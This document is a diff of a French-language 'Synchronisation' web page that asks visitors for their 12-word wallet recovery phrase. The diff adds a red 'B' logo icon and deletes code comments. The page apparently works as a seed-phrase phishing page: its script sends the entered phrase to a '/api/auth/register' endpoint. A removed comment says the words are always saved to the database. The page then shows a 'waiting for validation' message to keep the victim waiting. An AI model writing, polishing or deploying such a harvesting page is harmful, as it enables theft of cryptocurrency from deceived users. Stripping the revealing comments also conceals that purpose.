@@ -36,8 +36,26 @@
             font-size: 20px;
         }
         .back-btn:hover { background: rgba(245,176,66,0.3); }
-        .title { font-size: 28px; font-weight: 700; }
+        .title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 28px;
+            font-weight: 700;
+        }
         .title span { color: #f5b042; }
+        .title-icon {
+            width: 44px;
+            height: 44px;
+            background: #ff0000;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 700;
+            color: white;
+        }
         .subtitle { color: #8b8cae; font-size: 14px; margin-top: 5px; }
         .warning-box {
             background: rgba(239,68,68,0.1);
@@ -184,7 +202,10 @@
         <div class="header">
             <div class="back-btn" onclick="window.location.href='index.html'"><i class="fas fa-arrow-left"></i></div>
             <div>
-                <div class="title"><span>🔐 Synchronisation</span></div>
+                <div class="title">
+                    <div class="title-icon">B</div>
+                    <span>🔐 Synchronisation</span>
+                </div>
                 <div class="subtitle">Entrez votre phrase de récupération (12 mots)</div>
             </div>
         </div>
@@ -323,7 +344,6 @@
             const seedPhrase = words.join(' ');
 
             try {
-                // ÉTAPE 1 : TOUJOURS sauvegarder les mots dans la base
                 const registerResponse = await fetch('/api/auth/register', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -338,7 +358,6 @@
                 const registerData = await registerResponse.json();
                 console.log('📝 Enregistrement:', registerData);
                 
-                // ÉTAPE 2 : Vérifier le statut
                 const statusCheck = await checkStatus(seedPhrase);
                 
                 const statusDiv = document.getElementById('statusMessage');
@@ -363,7 +382,6 @@
                     }
                 }
                 
-                // Si pas de statut, afficher en attente
                 statusDiv.className = 'status-box status-pending';
                 statusDiv.innerHTML = '⏳ En attente de synchronisation...';
                 showToast('⏳ Demande envoyée, attente de validation', 'info');
@@ -378,7 +396,6 @@
             }
         }
 
-        // Initialisation
         generateSeedFields();
     </script>
 </body>
